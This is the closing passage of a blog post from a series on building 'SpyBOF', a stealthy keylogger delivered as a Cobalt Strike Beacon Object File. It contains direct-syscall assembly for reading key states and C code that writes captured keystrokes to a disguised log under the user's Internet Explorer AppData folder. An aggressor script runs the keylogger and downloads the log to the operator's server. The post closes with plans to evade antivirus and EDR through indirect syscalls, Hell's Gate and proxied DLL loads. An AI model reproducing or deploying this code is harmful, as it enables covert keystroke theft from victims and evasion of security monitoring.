</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__asm__</span>(<span style="color:#e6db74">&#34;myNtUserGetKeyState: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov r10, rcx </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov eax, edx </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ret </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc .<span style="color:#ae81ff">\m</span>ain.c .<span style="color:#ae81ff">\s</span>yscalls.c -o direct.exe -masm<span style="color:#f92672">=</span>intel
</span></span></code></pre></div><h2 id="5-transiting-to-bof">5. Transiting to BOF</h2>
<p>When writing BOF, we won&rsquo;t include the syscall.h but the syscall.<strong>c</strong> instead. Plus, we&rsquo;re going to compile in a slighty different way (here we&rsquo;re compiling on Linux).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>x86_64-w64-mingw32-gcc -c keylogger.c -o keylogger.o -masm<span style="color:#f92672">=</span>intel
</span></span></code></pre></div><p>It&rsquo;s also necessary to adapt the code in order to have <a href="https://github.com/Chaoui-lpb/SpyBOF/blob/main/Keylogging/IndirectSyscalls/keylogger.c" target="_blank">a final version</a></p>
<p>(<strong>Old note</strong> Something that we can highlight and is really interesting is the fact that the BOF never fails. When this BOF is just in C file, if we try to compile it, the 1st execution will fail and all other will succeed. This doesn&rsquo;t happen when with a BOF. It&rsquo;s complex to explain why exactly it happens but we can make the assumption that the beacon loads different things into memory that are maybe used in a way or another by the <code>win32u.dll</code>.)
&ndash;&gt; After investigation, it&rsquo;s because we have to manually load <code>win32u.dll</code> to initialize some sort of structure</p>
<h2 id="6-hide-the-file">6. Hide the file</h2>
<p>Different techniques are used in order to hide files. We&rsquo;ll search to have something not visible by the user. In Windows, we can use <code>attrib.exe</code> to hide the file with powershell but there is a risk to trigger an alert. We&rsquo;ll use also unexpected locations like the bin or System32 for instance.
&ndash;&gt; Always the same techniques are reused, easily detected. We have to find new techniques.</p>
<p>Here are a few ideas for future work that have not yet been implemented
💡The idea would be to use steganography in order to hide a file in a picture. Maybe default pictures on any windows machine or in thumbnails image? In any case there are default images for wallpaper in <code>C:\Windows\Web\Wallpaper\Theme1</code></p>
<p>💡Another idea &ldquo;jumping file&rdquo;. A file that moves around. Jumping from one position to another but clear IoC&hellip;</p>
<p>💡Or create a fake usb key? To mimic the insertion of a USB stick</p>
<p>The idea implemented in this project is the following
Better in <code>C:\Users\%USER%\AppData\Local\Microsoft\Internet Explorer\brnlog.log</code></p>
<p>Therefore, we have to adapt our BOF code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlobj.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;lmcons.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>FILE <span style="color:#f92672">*</span>file;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> filePath[MAX_PATH];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> userName[UNLEN <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>DWORD userNameLen <span style="color:#f92672">=</span> UNLEN <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> fullFilePath[MAX_PATH];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Récupérer le nom de l&#39;utilisateur actuel
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ADVAPI32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">GetUserNameA</span>(userName, <span style="color:#f92672">&amp;</span>userNameLen)) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">BeaconPrintf</span>(CALLBACK_ERROR, <span style="color:#e6db74">&#34;Error getting username&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Récupérer le chemin vers le dossier AppData local
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (SHELL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">SHGetFolderPathA</span>(NULL, CSIDL_LOCAL_APPDATA, NULL, <span style="color:#ae81ff">0</span>, filePath) <span style="color:#f92672">!=</span> S_OK) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">BeaconPrintf</span>(CALLBACK_ERROR, <span style="color:#e6db74">&#34;Error getting AppData path&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Build the complete file path
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>MSVCRT<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">sprintf</span>(fullFilePath, <span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Internet Explorer</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">brnlog.log&#34;</span>, filePath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HANDLE hFile <span style="color:#f92672">=</span> KERNEL32<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">CreateFileA</span>(
</span></span><span style="display:flex;"><span>	fullFilePath,                <span style="color:#75715e">// File name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	GENERIC_WRITE,           <span style="color:#75715e">// Desired access
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#ae81ff">0</span>,                       <span style="color:#75715e">// Share mode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	NULL,                    <span style="color:#75715e">// Security attributes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	CREATE_ALWAYS,           <span style="color:#75715e">// Creation disposition
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	FILE_ATTRIBUTE_NORMAL,   <span style="color:#75715e">// Flags and attributes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	NULL                     <span style="color:#75715e">// Template file handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>);
</span></span></code></pre></div><p>And the aggressor script in order to download the file on the server</p>
<pre tabindex="0"><code class="language-sleep" data-lang="sleep">sub keylogIndirect {
    local(&#39;$bid $handle $data $args $download $lpath $name&#39;);
    
    $bid = $1;
    $param = $2;

    println(&#34;Params are&#34;);
    println($param[&#34;time&#34;]);
    
    $time = int($param[&#34;time&#34;]);
    
    $handle = openf(script_resource(&#34;Keylogging/IndirectSyscalls/keylogger.o&#34;));
    $data   = readb($handle, -1);
	closef($handle);

    $args   = bof_pack($1, &#34;i&#34;, $time);
    println(&#34;Arg is&#34;);
    println($time);

    btask($1, &#34;Running indirect syscall keylogger&#34;);

    beacon_inline_execute($bid, $data, &#34;go&#34;, $args);

    println(&#34;Username is&#34;);
    $user = binfo($bid, &#34;user&#34;);
    println($user);

    btask($1, &#34;Downloading file&#34;);
    bdownload($1, &#34;c:\\Users\\ $+ $user\\AppData\\Local\\Microsoft\\Internet Explorer\\brnlog.log&#34;);
}
</code></pre><h2 id="7--future-idea-working-with-gafasynckeystate">7.  Future idea: working with <code>gafAsyncKeyState</code></h2>
<p>This idea remains very complex to put in place and is presented here with the aim of a possible future very advanced implementation.
<a href="https://eversinc33.com/posts/kernel-mode-keylogging.html" target="_blank">REF2</a></p>
<p>More references
<a href="https://github.com/Pengrey/Keylogger/blob/main/NtUserGetAsyncKeyState/Syscall/src/main.c" target="_blank">DirectSyscall buggy implem</a></p>
<h2 id="8-towards-expert-keylogger">8. Towards &ldquo;Expert keylogger&rdquo;</h2>
<p>There are still <!-- raw HTML omitted -->3 problems<!-- raw HTML omitted --> with this solution:</p>
<ol>
<li>The syscall instruction is called directly from our executable</li>
<li>The use of <strong>GetModuleHandle</strong> and <strong>GetProcAddress</strong> are still IoCs that can be detected very quickly</li>
<li>The use of <strong>LoadLibrary</strong> is also an IoC that could be detected by AV/EDR</li>
</ol>
<p>Therefore, in the following part, we implement <!-- raw HTML omitted -->3 solutions<!-- raw HTML omitted -->:</p>
<ol>
<li>Using <a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls" target="_blank">indirect syscalls</a></li>
<li>Using <a href="https://redops.at/en/blog/exploring-hells-gate" target="_blank">hell&rsquo;s gate</a></li>
<li>Using <a href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/" target="_blank">proxying DLL loads</a></li>
</ol>

  
  <hr>
<div class="footer">
    
    
    
    <p>
    This is a post in the <b><a href="http://localhost:1313/series/spybof-implem">SpyBOF implem</a></b> series.
        <br>Other posts in this series:
        <ul class="series">
            
            
            
        </ul>
    </p>
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#0-basic-keyloggers">0. Basic Keyloggers</a></li>
    <li><a href="#1-analyse-getasynckeystate">1. Analyse GetAsyncKeyState</a></li>
    <li><a href="#2-retrieve-syscall-number-dynamically">2. Retrieve syscall number dynamically</a></li>
    <li><a href="#3-move-syscall-on-the-stack">3. Move syscall on the stack</a></li>
    <li><a href="#4-load-the-user32-library">4. Load the user32 library</a></li>
    <li><a href="#5-transiting-to-bof">5. Transiting to BOF</a></li>
    <li><a href="#6-hide-the-file">6. Hide the file</a></li>
    <li><a href="#7--future-idea-working-with-gafasynckeystate">7.  Future idea: working with <code>gafAsyncKeyState</code></a></li>
    <li><a href="#8-towards-expert-keylogger">8. Towards &ldquo;Expert keylogger&rdquo;</a></li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
